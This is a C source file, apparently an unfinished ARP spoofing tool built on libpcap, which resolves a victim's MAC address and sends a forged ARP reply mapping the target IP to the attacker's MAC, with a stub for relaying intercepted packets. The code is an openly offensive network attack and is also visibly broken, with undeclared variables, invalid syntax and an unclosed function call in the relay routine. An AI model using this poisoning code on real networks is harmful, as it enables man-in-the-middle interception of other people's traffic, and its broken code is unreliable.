#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

#include "arpheader.h"

void parse_usr_mac_address(char*,char*);
void parse_usr_ip_address (char*,struct in_addr*);
void make_packet(u_char**, int*, int, struct in_addr, struct in_addr, u_char*, u_char*);
int filtering(const u_char*, struct in_addr, uint16_t operation);
int relay_filtering(const u_char*, u_char*, u_char*, u_char*, struct in_addr, struct in_addr, struct in_addr, int length);

int main(int argc, char** argv){
	char  errbuf[PCAP_ERRBUF_SIZE];
	char* interface = argv[1];
	char  host_ip_str[16];
	
	struct bpf_program fp;

	struct in_addr sender_ip;
	struct in_addr target_ip;
	struct in_addr host_ip	;

	u_char host_mac[6];

	u_char send_mac[6];
	u_char* payload;
	u_char* payload2;
	const u_char* rcv_packet;

	bpf_u_int32 inet;
	bpf_u_int32 submask;

	pcap_t* handle;
	struct pcap_pkthdr* header;
	
	int length;
	int length2;
	
	if(argc < 4){printf("Argv 1 : Network Interface / Argv 2 : Victim IP Addr / Argv 3 : Target IP Addr\n");return -1;}

	parse_usr_mac_address(interface, host_mac);
	parse_usr_ip_address (interface, &host_ip);

	inet_ntop(AF_INET,&host_ip,host_ip_str,sizeof(char) * 16);
	inet_pton(AF_INET,argv[2],&sender_ip);
	inet_pton(AF_INET,argv[3],&target_ip);

	printf("Usr Mac Addr : ");
	for(int i = 0 ; i < 5 ; i++) printf("%x : ",host_mac[i]);
	printf("%x\nUsr IP Addr : %s\n",host_mac[5], inet_ntoa(host_ip));
	
	payload = (u_char *)malloc(sizeof(u_char) * 1000);
	handle = pcap_open_live(argv[1], 65536, 1, 1000, errbuf);
	if(handle == NULL){printf("Cannot Open Device %s\n", interface);return -1;}
	if(pcap_lookupnet(interface,&inet,&submask,errbuf) == -1){printf("Different Network\n");return -1;}
		
	make_packet(&payload, &length,__ARP_REQUEST__,host_ip,sender_ip,host_mac,send_mac);
	for(int i = 0 ; i < length ; i++) printf("%x ",payload[i]);
	printf("\n");	
	while(pcap_sendpacket(handle, payload, length));
		
	/* Capture ARP Reply */
	while(pcap_next_ex(handle, &header, &rcv_packet)!=1);
	if(filtering(rcv_packet,sender_ip, __ARP_REPLY__) == 1){
		for(int i = 0,j = 6 ; i < 6 ; i++,j++){send_mac[i] = rcv_packet[j];}
		printf("\n");
		for(int i = 0 ; i < 5 ; i++) printf("%X : ", send_mac[i]);	
		printf("%X\n",send_mac[5]);
		
		memset(payload,0,length);
		make_packet(&payload, &length,__ARP_REPLY__,target_ip,sender_ip,host_mac,send_mac);
		
		while(pcap_sendpacket(handle,payload,length));	
	}
	
	make_packet(&payload2, &length2, __ARP_REQUEST__, host_ip, target_ip, host_mac, target_mac);
	/* Capture Sender's Packet */
	while(pcap_next_ex(handle, &header, &rcv_packet) != 1);
	
}

int filtering(const u_char* rcv_packet, struct in_addr sender_ip, uint16_t operation){
	struct ether_header *eth = (struct ether_header*)rcv_packet;
	arphdr *arp = (arphdr*)(rcv_packet + sizeof(*eth));
	if(eth->ether_type == htons(ETHERTYPE_ARP) && (arp->operation == htons(operation))){
		for(int i = 0 ; i < 4 ; i++) printf("%ld ",arp->src_ip_addr[i]);
		return 1;
	}
	else return 0;
}

int relay_filtering(const *u_char rcv_packet, u_char* host_mac, u_char* sender_mac, u_char* target_mac, struct in_addr* host_ip, struct in_addr* sender_ip, struct in_addr* target_ip,int length){
	struct ether_header *eth = (struct ether_header*) rcv_packet;
	struct iphdr *iph = (struct iphdr*)(rcv_packet + sizeof(*eth));
	unsigned short IP_HEADER_LENGTH = iph->ihl * 4;
	struct tcphdr* tcph = (struct tcphdr*)(buf + IP_HEADER_LENGTH + sizeof(*eth));
	arphdr *arp = (arphdr*)(rcv_packet + sizeof(*eth));
	u_int8_t broadcast[6] = [0xff,0xff,0xff,0xff,0xff,0xff];
	
	// arp packet / sender -> host (mac)
	if(eth->ether_type == htons(ETHERTYPE_ARP)&&(!strncmp(eth->ether_shost,sender_mac,6) && (!strncmp(eth->ether_dhost,host_mac,6)))){
		memset(rcv_packet, 0, sizeof(rcv_packet));
		make_packet(&rcv_packet, &length, 
	}
	
}

void parse_usr_mac_address(char* interface, char mac_addr[]){			/*PARSE MAC ADDRESS*/
	int fd;
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);	

	for(int i = 0 ; i < __MACADDR_LEN__ ; i++){mac_addr[i] = ifr.ifr_addr.sa_data[i];}
	close(fd);
}

void parse_usr_ip_address (char* interface, struct in_addr* ip){			/*PARSE IP  ADDRESS*/
	int fd;
	struct ifreq ifr;
	struct sockaddr_in* sin;
	const int IPADDR_START = 2;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name,interface,IFNAMSIZ-1);
	ioctl(fd,SIOCGIFADDR, &ifr);
	sin = (struct socaddr_in*) &ifr.ifr_addr;
	*ip = sin->sin_addr;
	close(fd);
}

void make_packet(u_char** packet, int* length, int operation, struct in_addr host_ip, struct in_addr sender_ip, u_char host_mac[], u_char send_mac[]){
	struct ether_header eth;
	arphdr arp;
	
	if(operation == __ARP_REQUEST__) for(int i = 0 ; i < 6 ; i++) eth.ether_dhost[i] = 0xff;		//broadcast!
	if(operation == __ARP_REPLY__)   for(int i = 0 ; i < 6 ; i++) eth.ether_dhost[i] = send_mac[i];		//unicast!
	for(int i = 0 ; i < 6 ; i++) eth.ether_shost[i] = host_mac[i];
	eth.ether_type = 0x0608;
	
	arp.hw_type = 0x0100;
	arp.proto_type = 0x0008;
	arp.hw_addr_len = 6;
	arp.proto_addr_len = 4;
	arp.operation = htons(operation);
	
	for(int i = 0 ; i < 6 ; i++) arp.src_hw_addr[i] = host_mac[i];
	if(operation == __ARP_REQUEST__) for(int i = 0 ; i < 6 ; i++) arp.dst_hw_addr[i] = 0x00;
	if(operation == __ARP_REPLY__)   for(int i = 0 ; i < 6 ; i++) arp.dst_hw_addr[i] = send_mac[i];

 	memcpy(arp.src_ip_addr, &host_ip, sizeof(host_ip));
	memcpy(arp.dst_ip_addr, &sender_ip, sizeof(sender_ip));
	
	memcpy((*packet), &eth,sizeof(eth));
	(*length) = sizeof(eth);
	memcpy((*packet) + (*length) , &arp, sizeof(arphdr));

	(*length) +=  sizeof(arphdr);
}
